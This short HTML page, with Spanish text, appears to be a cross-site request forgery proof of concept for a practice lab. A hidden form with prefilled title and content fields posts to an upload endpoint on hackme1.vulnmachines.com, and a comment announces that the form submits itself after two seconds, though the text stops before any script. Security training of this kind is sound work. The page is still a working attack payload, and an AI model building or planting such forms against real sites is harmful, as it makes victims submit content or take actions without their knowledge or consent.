<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - Upload</title>
</head>
<body>
    <h1>CSRF Attack - Upload Form</h1>
    <p>Este formulario simula un ataque CSRF contra el formulario de upload.</p>
    
    <form id="csrfForm" action="http://hackme1.vulnmachines.com/csrf/upload.php" method="POST">
        <input type="hidden" name="title" value="CSRF Attack Composition">
        <input type="hidden" name="comp" value="Esta es una composición maliciosa enviada mediante CSRF. El atacante puede hacer que la víctima suba contenido sin su conocimiento.">

        // Auto-submit del formulario después de 2 segundos
